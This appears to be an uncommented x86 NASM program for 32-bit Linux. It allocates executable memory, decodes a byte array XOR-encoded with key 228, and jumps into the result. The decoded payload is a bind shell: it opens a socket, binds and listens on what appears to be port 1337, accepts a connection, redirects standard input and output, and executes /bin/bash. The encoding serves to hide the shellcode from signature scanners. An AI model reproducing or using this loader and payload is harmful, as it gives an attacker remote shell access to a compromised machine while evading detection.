;; vim: ft=nasm

global _start

struc mmap_arg
  .suggest: resd 1
  .length:  resd 1
  .perm:    resd 1
  .flags:   resd 1
  .fd:      resd 1
  .file_off:resd 1
  .size:
endstruc

section .text
; text {{{

; _start {{{
_start:
	mov ebp, esp
	dec esp
	dec esp
	dec esp
	dec esp
;	sub esp, 4 ;; address allocated by mmap

	xor eax, eax
	add al, mmap_arg.size
	sub esp, eax ;; sub esp, size

	xor eax, eax
	mov [esp + mmap_arg.suggest], eax
	xor eax, eax
	add ax, codesize
	mov [esp + mmap_arg.length], eax
	xor eax, eax
	add al, 7
	mov [esp + mmap_arg.perm], eax ;; rwx
	xor eax, eax
	add al, 0x22
	mov [esp + mmap_arg.flags], eax ;; MAP_PRIVATE|MAP_ANONYMOUS
	xor eax, eax
	mov [esp + mmap_arg.file_off], eax
	dec eax
	mov [esp + mmap_arg.fd], eax
	inc eax
	add al, 0x5a
	mov ebx, esp
	int 0x80
	mov [ebp-4], eax

	xor eax, eax
	add al, mmap_arg.size
	add esp, eax

	xor eax, eax
	add al, codesize

	mov ebx, code
	add ebx, eax
	mov edi, [ebp-4]
	mov esi, code
.loop:	lodsb
	xor al, 228
	stosb
	cmp esi, ebx
	jne .loop

	mov eax, [ebp-4]
	call eax
; }}}

; }}}

section .data
; data {{{
code: db 0x6d, 0x01, 0x67, 0x08, 0xec, 0x82, 0x8c, 0xe1, 0xdd, 0x6d, 0x01, 0x8e, 0xe4, 0x8e, 0xe5, 0x8e, 0xe6, 0x5c, 0x82, 0xe4, 0xe4, 0xe4, 0x5f, 0xe5, 0xe4, 0xe4, 0xe4, 0x6d, 0x05, 0x29, 0x64, 0x6d, 0x26, 0x6d, 0x08, 0x8e, 0xe5, 0x6d, 0x04, 0x8e, 0xe0, 0xb4, 0x8e, 0xe6, 0x8e, 0xe5, 0xb6, 0x5c, 0x82, 0xe4, 0xe4, 0xe4, 0x5f, 0xea, 0xe4, 0xe4, 0xe4, 0x6d, 0x05, 0x29, 0x64, 0x6d, 0x08, 0x67, 0x08, 0xf4, 0x23, 0xa0, 0xc0, 0xe0, 0xe4, 0xe4, 0xe4, 0xe4, 0x82, 0x23, 0xa0, 0xc0, 0xe6, 0xe1, 0xdd, 0x82, 0x23, 0xe0, 0xc0, 0xe6, 0xe4, 0x23, 0xa0, 0xc0, 0xec, 0xe4, 0xe4, 0xe4, 0xe4, 0x23, 0xa0, 0xc0, 0xe8, 0xe4, 0xe4, 0xe4, 0xe4, 0x6d, 0x02, 0x8e, 0xf4, 0xb2, 0xb6, 0x5c, 0x82, 0xe4, 0xe4, 0xe4, 0x5f, 0xe6, 0xe4, 0xe4, 0xe4, 0x6d, 0x05, 0x29, 0x64, 0x6d, 0x08, 0x8e, 0xe4, 0xb6, 0x5c, 0x82, 0xe4, 0xe4, 0xe4, 0x5f, 0xe0, 0xe4, 0xe4, 0xe4, 0x6d, 0x05, 0x29, 0x64, 0x6d, 0x08, 0x8e, 0xe4, 0x8e, 0xe4, 0xb6, 0x5c, 0x82, 0xe4, 0xe4, 0xe4, 0x5f, 0xe1, 0xe4, 0xe4, 0xe4, 0x6d, 0x05, 0x29, 0x64, 0x6d, 0xa1, 0x1c, 0x6d, 0x08, 0x5c, 0xdb, 0xe4, 0xe4, 0xe4, 0x6f, 0xb9, 0x1c, 0x5d, 0xe4, 0xe4, 0xe4, 0xe4, 0x29, 0x64, 0x5c, 0xdb, 0xe4, 0xe4, 0xe4, 0x6f, 0xb9, 0x1c, 0x5d, 0xe5, 0xe4, 0xe4, 0xe4, 0x29, 0x64, 0x5c, 0xdb, 0xe4, 0xe4, 0xe4, 0x6f, 0xb9, 0x1c, 0x5d, 0xe6, 0xe4, 0xe4, 0xe4, 0x29, 0x64, 0x67, 0x08, 0xe8, 0x23, 0xe0, 0xc0, 0xcb, 0x86, 0x8d, 0x8a, 0x23, 0xa0, 0xc0, 0xe0, 0xcb, 0x86, 0x85, 0x97, 0x23, 0xa0, 0xc0, 0xec, 0x8c, 0xe4, 0xe4, 0xe4, 0x5c, 0xef, 0xe4, 0xe4, 0xe4, 0x6d, 0x07, 0x5d, 0xe4, 0xe4, 0xe4, 0xe4, 0x5e, 0xe4, 0xe4, 0xe4, 0xe4, 0x29, 0x64
codesize equ $ - code
; }}}
